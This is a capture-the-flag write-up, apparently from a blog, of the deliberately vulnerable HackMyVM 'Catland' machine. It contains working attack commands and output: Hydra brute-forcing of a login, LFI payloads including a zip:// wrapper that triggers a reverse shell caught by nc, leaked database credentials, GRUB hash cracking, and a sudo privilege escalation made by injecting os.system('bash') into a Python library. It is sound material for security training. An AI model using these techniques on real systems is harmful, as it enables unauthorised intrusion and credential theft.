---
layout: post
title: "HackMyVM - Catland"
date: 2023-01-27 22:30:00 +0100
categories: hmv
tag: ["LFI", "MySQL", "Python"]
---
# HackMyVM > CatLand

Creator: [cromiphi](https://hackmyvm.eu/profile/?user=cromiphi)
Level: Medium
Release Date: 2023-01-12

## Scan & Enumeration 

* ADD catland.hmv to /etc/hosts

```bash
$ nmap -sC -sV -oA nmap/CatLand -p- 192.168.1.12
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-27 22:30 WET
Nmap scan report for 192.168.1.12
Host is up (0.00037s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c71014a89af0251e0db1c66f1ca188d8 (RSA)
|   256 1b66f4e5b6236e778e9ec178c5bcace9 (ECDSA)
|_  256 f4e9d87a0815d0929014dfb3ec81a1ed (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Catland
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.77 seconds
```

### GoBuster

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u "http://catland.hmv/" -x php,txt,html,zip,bak 
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://catland.hmv/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              zip,bak,php,txt,html
[+] Timeout:                 10s
===============================================================
2023/01/27 22:42:11 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
/images               (Status: 301) [Size: 311] [--> http://catland.hmv/images/]
/index.php            (Status: 200) [Size: 757]
/gallery.php          (Status: 200) [Size: 479]
```

### SubDomain

```bash
$ sudo ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://catland.hmv -H "Host: FUZZ.catland.hmv" -fs 757

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://catland.hmv
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.catland.hmv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 757
________________________________________________

admin                   [Status: 200, Size: 1068, Words: 103, Lines: 24, Duration: 26ms]
```

```bash
$ curl "http://admin.catland.hmv"
```

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Admin panel</title>
</head>
<script src="redirect.js"></script>
<script>
  redirectToSubdomain();
</script>
<body style="background-color: #003366; color: white; font-family: sans-serif;">
  <h1 style="text-align: center;">Staff connection</h1>
  <form id="login-form" action="" method="post" style="max-width: 500px; margin: auto;">
    <label for="username" style="display: block;">Login:</label>
    <input type="text" id="username" name="username" style="width: 100%; padding: 10px; box-sizing: border-box; margin-bottom: 20px;">
    <label for="password" style="display: block;">Password:</label>
    <input type="password" id="password" name="password" style="width: 100%; padding: 10px; box-sizing: border-box; margin-bottom: 20px;">
    <button type="submit" style="width: 100%; padding: 10px; background-color: #0099cc; color: white; font-size: 16px; cursor: pointer;">Connect</button>
  </form> 
  <div id="error-message" style="color: red;"></div>
</body>
</html>

Invalid username or password    
```

### Burpsuite (Do Intercept > Response to this request)

<img src="https://drive.google.com/uc?id=1G4vBioq2oqIqJgrtZw11k0gMAR18e_Re"/>

* Remove redirect

```html
<script>
  redirectToSubdomain();
</script>
```

<img src="https://drive.google.com/uc?id=1qtSFHIFkwRTZSyU2jdlnAdUK97jHQmi-"/>

## CUPP User bruteforce (laura)

```bash
$ sudo cupp -i               
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: laura
....

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to laura.txt, counting 108 words.
[+] Now load your pistolero with laura.txt and shoot! Good luck!
```

### HYDRA

```bash
$ hydra -l laura -P laura.txt admin.catland.hmv http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid username or password"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-27 23:43:23
[DATA] max 16 tasks per 1 server, overall 16 tasks, 108 login tries (l:1/p:108), ~7 tries per task
[DATA] attacking http-post-form://admin.catland.hmv:80/index.php:username=^USER^&password=^PASS^:Invalid username or password
[80][http-post-form] host: admin.catland.hmv   login: laura   password: La*******8
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-27 23:43:24
```

### LFI

```url
http://admin.catland.hmv/user.php?page=/etc/passwd
```

## Reverse Shell

```url
http://admin.catland.hmv/user.php?page=zip://uploads/rshell%23zip
```

```bash
$ nc -lvnp 4444           
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.12] 60800
Linux catland.hmv 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64 GNU/Linux
 17:26:52 up 10 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd /var/www/
$ ls
admin
html
$ cd admin
$ ls -la
total 40
drwxr-xr-x 3 www-data www-data 4096 Jan  7 14:29 .
drwxr-xr-x 4 root     root     4096 Dec 31 13:03 ..
-rw-r--r-- 1 www-data www-data  853 Jan  7  2022 card.php
-rw-r--r-- 1 www-data www-data  255 Jan  7  2022 config.php
-rw-r--r-- 1 www-data www-data 1619 Jan  7  2022 index.php
-rw-r--r-- 1 www-data www-data   84 Jan  7  2022 redirect.js
-rw-r--r-- 1 www-data www-data  527 Jan  7  2022 style.css
-rw-r--r-- 1 www-data www-data 1731 Jan  7  2022 upload.php
drwxr-xr-x 2 www-data www-data 4096 Jan 28 19:00 uploads
-rw-r--r-- 1 www-data www-data  864 Jan  7  2022 user.php
$ cat config.php
<?php

$hostname = "localhost";
$database = "catland";
$username = "admin";
$password = "catlandpassword123";
$conn = mysqli_connect($hostname, $username, $password, $database);
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

?>
$ 
```

## Priviledge Escalation (MySQL)

```bash
www-data@catland:/var/www/admin$ mysql -u admin -pcatlandpassword123
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 33
Server version: 10.5.18-MariaDB-0+deb11u1 Debian 11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| catland            |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use catland;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [catland]> show tables;
+-------------------+
| Tables_in_catland |
+-------------------+
| comment           |
| users             |
+-------------------+
2 rows in set (0.001 sec)

MariaDB [catland]> select * from users;
+----------+------------+
| username | password   |
+----------+------------+
| laura    | laura_2008 |
+----------+------------+
1 row in set (0.001 sec)

MariaDB [catland]> select * from comment;
+----------------------+
| grub                 |
+----------------------+
| change grub password |
+----------------------+
1 row in set (0.001 sec)

MariaDB [catland]>

```

### Grub Password

```bash
www-data@catland:/etc/grub.d$ cat 01_password 
#!/bin/sh
set -e
cat << EOF
set superusers="root"
password_pbkdf2 root grub.pbkdf2.sha512.10000.CAEBC99F7ABA2AC4E57FFFD14649554857738C73E8254222A3C2828D2B3A1E12E84EF7BECE42A6CE647058662D55D9619CA2626A60DB99E2B20D48C0A8CE61EB.6E43CABE0BC795DC76072FC7665297B499C2EB1B020B5751EDC40A89668DBC73D9F507517474A31AE5A0B45452DAD9BD77E85AC0EFB796A61148CC450267EBBC
EOF
www-data@catland:/etc/grub.d$ ```

```bash
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Warning: detected hash type "PBKDF2-HMAC-SHA512", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Warning: detected hash type "PBKDF2-HMAC-SHA512", but the string is also recognized as "HMAC-SHA512"
Use the "--format=HMAC-SHA512" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (PBKDF2-HMAC-SHA512, GRUB2 / OS X 10.8+ [PBKDF2-SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
b*****ov         (?)     
1g 0:00:01:49 DONE (2023-03-01 16:47) 0.009101g/s 272.8p/s 272.8c/s 272.8C/s berbatov..balling
Use the "--show --format=PBKDF2-HMAC-SHA512" options to display all of the cracked passwords reliably
Session completed. 
```

```bash
$ ssh laura@192.168.1.12
laura@192.168.1.12's password: 
Linux catland.hmv 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64
Last login: Sat Jan  7 14:44:44 2023 from 192.168.0.29
laura@catland:~$ 
```

## ROOT

```bash
laura@catland:~$ cat /usr/bin/rtv                                                                                                                                  
#!/usr/bin/python3                                                                                                                                                     
# EASY-INSTALL-ENTRY-SCRIPT: 'rtv==1.27.0','console_scripts','rtv'                                                                                                     
import re                                                                                                                                                              
import sys

# for compatibility with easy_install; see #2198
__requires__ = 'rtv==1.27.0'

try:
    from importlib.metadata import distribution
except ImportError:
    try:
        from importlib_metadata import distribution
    except ImportError:
        from pkg_resources import load_entry_point
...
```

* Modify library for payload shell

```bash 
laura@catland:~$ find / -name metadata.py -print 2>/dev/null
/usr/lib/python3.9/importlib/metadata.py

laura@catland:~$ vi /usr/lib/python3.9/importlib/metadata.py

ADD os.system("bash")

laura@catland:~$ sudo /usr/bin/rtv --help
root@catland:/home/laura# id
uid=0(root) gid=0(root) groups=0(root)
```